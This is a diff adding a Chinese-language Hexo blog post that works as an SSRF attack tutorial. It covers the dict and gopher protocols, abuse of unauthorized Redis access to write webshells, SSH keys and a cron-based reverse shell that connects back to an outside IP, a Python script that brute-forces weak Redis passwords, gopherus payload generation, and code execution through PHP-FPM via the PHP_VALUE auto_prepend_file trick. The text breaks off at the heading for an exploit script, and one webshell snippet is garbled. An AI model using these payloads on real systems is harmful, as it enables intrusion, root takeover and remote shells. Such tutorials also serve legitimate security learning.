@@ -1,0 +1,656 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="Hexo" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+
+<link rel="canonical" href="http://example.com/2022/06/27/SSRF/">
+
+
+
+  <title>
+SSRF - web安全 |
+Yume Shoka = Hexo</title>
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">SSRF
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2022-06-27 13:38:45">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2022-06-27T13:38:45+08:00">2022-06-27</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Yume Shoka</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclfdu6exj20zk0m87hw.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclip4jbpj20zk0m87cv.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeuv80yoj20zk0m8kjl.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipexj2jgzj20zk0m8b09.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclhpw3lwj20zk0m8gvw.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclxfdlttj20zk0m8npd.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="In web安全"><span itemprop="name">web安全</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/27/SSRF/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="John Doe">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Hexo">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h2 id="ssrf"><a class="markdownIt-Anchor" href="#ssrf">#</a> SSRF</h2>
+<h3 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识">#</a> 前置知识</h3>
+<h4 id="1dict协议"><a class="markdownIt-Anchor" href="#1dict协议">#</a> 1.dict 协议</h4>
+<blockquote>
+<p>dict 协议是一个在线网络字典协议，这个协议是用来架设一个字典服务的。可以看到用这个协议架设的服务可以用 telnet 来登陆，说明这个协议应该是基于 tcp 协议开发的。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet dict.org 2628</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220325164738004.png" alt="image-20220325164738004"></p>
+<p>我们输入  <code>define [字典名] [单词]</code>  这样的命令来获取一个单词的解释</p>
+<p>比如说  <code>define english hello</code></p>
+<p>服务器就会返回对应的单词解释</p>
+<p>对弈一些 <code>tcp</code>  协议，用 <code>dict</code>  方法可以打开，在有 <code>waf</code>  的情况下可以获取一些开放的服务信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// 文件名: main.php</span><br><span class="line">  </span><br><span class="line">$url = &quot;dict://localhost:3306&quot;; // localhost:3306 上架设了我的 mysql 服务</span><br><span class="line"></span><br><span class="line">$ch = curl_init($url);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"></span><br><span class="line">N 5.5.62-log=gnsw|+\��!�n5[KF\&#123;wdo&quot;Umysql_native_password!��#08S01Got packets out of order1</span><br></pre></td></tr></table></figure>
+<p>配合 burpsuite 可以进行端口扫描</p>
+<h4 id="gopher协议"><a class="markdownIt-Anchor" href="#gopher协议">#</a> gopher 协议</h4>
+<p><code>gopher</code>  协议是一种信息查找系统，他将 <code>Internet</code>  上的文件组织成某种索引，方便用户从 <code>Internet</code>  的一处带到另一处。在 <code>WWW</code>  出现之前， <code>Gopher</code>  是 <code>Internet</code>  上最主要的信息检索工具，Gopher 站点也是最主要的站点，使用 <code>tcp70</code>  端口。但在 <code>WWW</code>  出现后， <code>Gopher</code>  失去了昔日的辉煌。现在它基本过时，人们很少再使用它。</p>
+<p><code>gopher</code>  协议格式: <code>gopher://IP:port/_&#123;TCP/IP数据流&#125;</code></p>
+<p>gopher 可以接收 get 和 post 请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.109.166:80/_GET%20/get.php%3fparam=Konmu%20HTTP/1.1%0d%0aHost:192.168.109.166%0d%0a</span><br><span class="line">curl gopher://192.168.194.1:80/_POST%20/post.php%20HTTP/1.1%0d%0AHost:192.168.194.1%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:12%0d%0A%0d%0Aname=purplet%0d%0A</span><br></pre></td></tr></table></figure>
+<p>ssrf + gopher 可以实现 Redis 未授权访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST与GET传参的区别：它有4个参数为必要参数</span><br><span class="line"></span><br><span class="line">POST /post.php HTTP/1.1</span><br><span class="line">host:192.168.194.1</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:12name=purplet</span><br></pre></td></tr></table></figure>
+<h3 id="ssrf-redis-未授权访问"><a class="markdownIt-Anchor" href="#ssrf-redis-未授权访问">#</a> ssrf + Redis 未授权访问</h3>
+<p>攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作</p>
+<p>攻击者可以成功将自己的 ssh 公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用 ssh 服务登录目标服务器。</p>
+<p>简单说，漏洞的产生条件有以下两点:</p>
+<p>（1）redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源 ip 访问等相关安全策略，直接暴露在公网；<br>
+（2）没有设置密码认证（一般为空），可以免密码远程登录 redis 服务。</p>
+<p>1. 启动 redis</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可以指定配置文件启动(若不指定则以默认的配置文件启动)：</span><br><span class="line">./redis-server /etc/redis/redis.conf</span><br></pre></td></tr></table></figure>
+<p>安全模式起作用需要同时满足俩个条件：</p>
+<p>(1) redis 没有开启登录认证</p>
+<p>(2) redis 没有绑定到某个 ip 地址或 ip 段</p>
+<p>redis 默认是未开启登录认证，开启安全模式的.</p>
+<p>造成未授权访问有两种情况：</p>
+<ol>
+<li>未开启登录验证，并且把 IP 绑定到 0.0.0.0</li>
+<li>未开启登录验证，没有设置绑定 IP， <code>protected-mode</code>  关闭</li>
+</ol>
+<h4 id="利用redis写webshell"><a class="markdownIt-Anchor" href="#利用redis写webshell">#</a> 利用 Redis 写 webshell</h4>
+<p>通过设置目录后写入备份文件中</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20180829154920415-7768410.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxxxxxxxx set x &quot;\n\n&lt;?php phpinfo();?&gt;\n\n&quot;</span><br></pre></td></tr></table></figure>
+<p>用 redis 写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问redis.php</span><br></pre></td></tr></table></figure>
+<p>或者使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">                                                                                                ?&gt;&#x27;);</span><br><span class="line">exit();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="使用公钥私钥获取root权限"><a class="markdownIt-Anchor" href="#使用公钥私钥获取root权限">#</a> 使用公钥私钥获取 root 权限</h4>
+<p>生成公私钥，默认路径为 /root/.ssh</p>
+<p>本地生成私钥和公钥，将公钥写入备份文件，使用本地私钥登录</p>
+<p><code>ssh-keygen -t rsa</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">修改工作路径</span><br><span class="line">config set dir /root/.ssh</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">set pub &quot;我们刚刚生成的公钥&quot;</span><br><span class="line">登录：ssh -i id_rsa root@172.16.60.166</span><br><span class="line">id -&gt; 得到root</span><br></pre></td></tr></table></figure>
+<h4 id="redis未授权访问检测脚本"><a class="markdownIt-Anchor" href="#redis未授权访问检测脚本">#</a> redis 未授权访问检测脚本</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python</span><br><span class="line"># _*_  coding:utf-8 _*_</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">PASSWORD_DIC=[&#x27;redis&#x27;,&#x27;root&#x27;,&#x27;oracle&#x27;,&#x27;password&#x27;,&#x27;p@aaw0rd&#x27;,&#x27;abc123!&#x27;,&#x27;123456&#x27;,&#x27;admin&#x27;]</span><br><span class="line">def check(ip, port, timeout):</span><br><span class="line">    try:</span><br><span class="line">        socket.setdefaulttimeout(timeout)</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, int(port)))</span><br><span class="line">        s.send(&quot;INFO\r\n&quot;)</span><br><span class="line">        result = s.recv(1024)</span><br><span class="line">        if &quot;redis_version&quot; in result:</span><br><span class="line">            return u&quot;未授权访问&quot;</span><br><span class="line">        elif &quot;Authentication&quot; in result:</span><br><span class="line">            for pass_ in PASSWORD_DIC:</span><br><span class="line">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip, int(port)))</span><br><span class="line">                s.send(&quot;AUTH %s\r\n&quot; %(pass_))</span><br><span class="line">                result = s.recv(1024)</span><br><span class="line">                if &#x27;+OK&#x27; in result:</span><br><span class="line">                    return u&quot;存在弱口令，密码：%s&quot; % (pass_)</span><br><span class="line">    except Exception, e:</span><br><span class="line">        pass</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    ip=sys.argv[1]</span><br><span class="line">    port=sys.argv[2]</span><br><span class="line">    print check(ip,port, timeout=10)</span><br></pre></td></tr></table></figure>
+<h4 id="利用任务计划反弹shell"><a class="markdownIt-Anchor" href="#利用任务计划反弹shell">#</a> 利用任务计划反弹 shell</h4>
+<p>攻击者监听端口</p>
+<p><code>nc -lvnp 4444</code></p>
+<p>将备份放入任务计划中，同时将 crontab 内容写入文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/172.16.60.199/1234 0&gt;&amp;1\n\n&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron </span><br><span class="line">config set dbfilename  root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+<p>在反弹的 shell 中可以看数据库连接文件等，同时谁启动的 Redis 反弹就是谁的权限</p>
+<h4 id="利用ssrf中curl函数请求redis未授权访问"><a class="markdownIt-Anchor" href="#利用ssrf中curl函数请求redis未授权访问">#</a> 利用 ssrf 中 curl 函数请求 Redis 未授权访问</h4>
+<p>gopher 协议支持发出 GET、POST 请求：可以先截获 get 请求包和 post 请求包，在构成符合 gopher 协议的请求。gopher 协议是 ssrf 利用中最强大的协议。而 curl_exec 也是 tcp 的因此可以实现</p>
+<p><span class="exturl" data-url="aHR0cDovL3huLS1nb3BoZXJ1cy11dTdtNTMwMGEucHk=">利用 gopherus.py</span></p>
+<p>写入 webshell / 反弹 webshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python gopherus.py --exploit redis </span><br><span class="line">phpwebshell/reverseshell</span><br><span class="line">需要写入的payload</span><br><span class="line">得到最终的payload</span><br></pre></td></tr></table></figure>
+<p>注意：最后得到的 payload 如果从 url 输入需要二次编码，但使用 curl 命令就不需要</p>
+<p>两次因为 gopher 解码一次，url 解码一次</p>
+<h3 id="fastcgifpm未授权访问"><a class="markdownIt-Anchor" href="#fastcgifpm未授权访问">#</a> FastCGI，FPM 未授权访问</h3>
+<p>前置知识</p>
+<p>1.fastcgi &amp;&amp; fastcgi record</p>
+<p>Fastcgi 其实是一个通信协议，和 HTTP 协议一样，都是进行数据交换的一个通道。</p>
+<p>fastcgi 协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi 协议由多个 record 组成，record 也有 header 和 body 一说，服务器中间件将这二者按照 fastcgi 的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p>
+<p>record 组成如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  /* Header */</span><br><span class="line">  unsigned char version; // 版本</span><br><span class="line">  unsigned char type; // 本次record的类型</span><br><span class="line">  unsigned char requestIdB1; // 本次record对应的请求id</span><br><span class="line">  unsigned char requestIdB0;</span><br><span class="line">  unsigned char contentLengthB1; // body体的大小</span><br><span class="line">  unsigned char contentLengthB0;</span><br><span class="line">  unsigned char paddingLength; // 额外块大小</span><br><span class="line">  unsigned char reserved; </span><br><span class="line"></span><br><span class="line">  /* Body */</span><br><span class="line">  unsigned char contentData[contentLength];</span><br><span class="line">  unsigned char paddingData[paddingLength];</span><br><span class="line">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure>
+<p>头由 8 个 uchar 类型的变量组成，每个变量 1 字节。其中， <code>requestId</code>  占两个字节，一个唯一的标志 id，以避免多个请求之间的影响； <code>contentLength</code>  占两个字节，表示 body 的大小。</p>
+<p>语言端解析了 fastcgi 头以后，拿到 <code>contentLength</code> ，然后再在 TCP 流里读取大小等于 <code>contentLength</code>  的数据，这就是 body 体。一个 fastcgi record 结构最大支持的 body 大小是 <code>2^16</code> ，也就是 65536 字节。</p>
+<p>2.fastcgi type</p>
+<p><code>type</code>  就是指定该 record 的作用。因为 fastcgi 一个 record 的大小是有限的，作用也是单一的，所以我们需要在一个 TCP 流里传输多个 record。通过 <code>type</code>  来标志每个 record 的作用，用 <code>requestId</code>  作为同一次请求的 id。</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/e29518b1-3574-426f-b75f-8cabbb89a15a.9efc537226ce.jpg" alt="14931267923354.jpg"></p>
+<p>看了这个表格就很清楚了，服务器中间件和后端语言通信，第一个数据包就是 <code>type</code>  为 1 的 record，后续互相交流，发送 <code>type</code>  为 4、5、6、7 的 record，结束时发送 <code>type</code>  为 2、3 的 record。</p>
+<p>3.php fpm</p>
+<p>FPM 其实是一个 fastcgi 协议解析器，Nginx 等服务器中间件将用户请求按照 fastcgi 的规则打包好通过 TCP 传给谁？其实就是传给 FPM。</p>
+<p>用户访问 <code>http://127.0.0.1/index.php?a=1&amp;b=2</code> ，如果 web 目录是 <code>/var/www/html</code> ，那么 Nginx 会将这个请求变成如下 key-value 对：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,</span><br><span class="line">    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class="line">    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class="line">    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;,</span><br><span class="line">    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,</span><br><span class="line">    &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,</span><br><span class="line">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>PHP-FPM 拿到 fastcgi 的数据包后，进行解析，得到上述这些环境变量。然后，执行 <code>SCRIPT_FILENAME</code>  的值指向的 PHP 文件，也就是 <code>/var/www/html/index.php</code> 。</p>
+<h4 id="iis70解析漏洞"><a class="markdownIt-Anchor" href="#iis70解析漏洞">#</a> IIS7.0 解析漏洞</h4>
+<p>漏洞现象是，在用户访问 <code>http://127.0.0.1/favicon.ico/.php</code>  时，访问到的文件是 favicon.ico，但却按照.php 后缀解析了。</p>
+<p>用户请求 <code>http://127.0.0.1/favicon.ico/.php</code> ，nginx 将会发送如下环境变量到 fpm 里：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/favicon.ico/.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/favicon.ico/.php&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;: &#x27;/favicon.ico/.php&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>正常来说， <code>SCRIPT_FILENAME</code>  的值是一个不存在的文件 <code>/var/www/html/favicon.ico/.php</code> ，是 PHP 设置中的一个选项 <code>fix_pathinfo</code>  导致了这个漏洞。PHP 为了支持 Path Info 模式而创造了 <code>fix_pathinfo</code> ，在这个选项被打开的情况下，fpm 会判断 <code>SCRIPT_FILENAME</code>  是否存在，如果不存在则去掉最后一个 <code>/</code>  及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。</p>
+<p>所以，第一次 fpm 发现 <code>/var/www/html/favicon.ico/.php</code>  不存在，则去掉 <code>/.php</code> ，再判断 <code>/var/www/html/favicon.ico</code>  是否存在。显然这个文件是存在的，于是被作为 PHP 文件执行，导致解析漏洞。</p>
+<p>正确的解决方法有两种，一是在 Nginx 端使用 <code>fastcgi_split_path_info</code>  将 path info 信息去除后，用 tryfiles 判断文件是否存在；二是借助 PHP-FPM 的 <code>security.limit_extensions</code>  配置项，避免其他后缀文件被解析。</p>
+<h4 id="fastcgi-未授权访问"><a class="markdownIt-Anchor" href="#fastcgi-未授权访问">#</a> fastcgi 未授权访问</h4>
+<p><strong>PHP-FPM 默认监听 9000 端口，如果这个端口暴露在公网，则我们可以自己构造 fastcgi 协议，和 fpm 进行通信。</strong></p>
+<p><code>SCRIPT_FILENAME</code>  的值就格外重要了。因为 fpm 是根据这个值来执行 php 文件的，如果这个文件不存在，fpm 会直接返回 404：</p>
+<p>由于设置了 security.limit_extensions，其限定了只有某些后缀的文件允许被 fpm 执行，默认是 <code>.php</code> 。</p>
+<p>由于这个配置项的限制，如果想利用 PHP-FPM 的未授权访问漏洞，首先就得找到一个已存在的 PHP 文件。</p>
+<p>我们可以找找默认源安装后可能存在的 php 文件，比如 <code>/usr/local/lib/php/PEAR.php</code> 。</p>
+<p>PHP.INI 中有两个有趣的配置项， <code>auto_prepend_file</code>  和 <code>auto_append_file</code> 。</p>
+<p><code>auto_prepend_file</code>  是告诉 PHP，在执行目标文件之前，先包含 <code>auto_prepend_file</code>  中指定的文件； <code>auto_append_file</code>  是告诉 PHP，在执行完成目标文件后，包含 <code>auto_append_file</code>  指向的文件。</p>
+<p>那么就有趣了，假设我们设置 <code>auto_prepend_file</code>  为 <code>php://input</code> ，那么就等于在执行任何 php 文件前都要包含一遍 POST 的内容。所以，我们只需要把待执行的代码放在 Body 中，他们就能被执行了。（当然，还需要开启远程文件包含选项 <code>allow_url_include</code> ）</p>
+<p>那么，我们怎么设置 <code>auto_prepend_file</code>  的值？</p>
+<p>这又涉及到 PHP-FPM 的两个环境变量， <code>PHP_VALUE</code>  和 <code>PHP_ADMIN_VALUE</code> 。这两个环境变量就是用来设置 PHP 配置项的， <code>PHP_VALUE</code>  可以设置模式为 <code>PHP_INI_USER</code>  和 <code>PHP_INI_ALL</code>  的选项， <code>PHP_ADMIN_VALUE</code>  可以设置所有选项。（ <code>disable_functions</code>  除外，这个选项是 PHP 加载的时候就确定了，在范围内的函数直接不会被加载到 PHP 上下文中）</p>
+<p>所以，我们最后传入如下环境变量：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,</span><br><span class="line">    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,</span><br><span class="line">    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,</span><br><span class="line">    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,</span><br><span class="line">    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,</span><br><span class="line">    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,</span><br><span class="line">    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,</span><br><span class="line">    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;REMOTE_PORT&#x27;: &#x27;12345&#x27;,</span><br><span class="line">    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,</span><br><span class="line">    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,</span><br><span class="line">    &#x27;SERVER_NAME&#x27;: &quot;localhost&quot;,</span><br><span class="line">    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;</span><br><span class="line">    &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;,</span><br><span class="line">    &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>设置 <code>auto_prepend_file = php://input</code>  且 <code>allow_url_include = On</code> ，然后将我们需要执行的代码放在 Body 中，即可执行任意代码。</p>
+<p>利用脚本：</p>
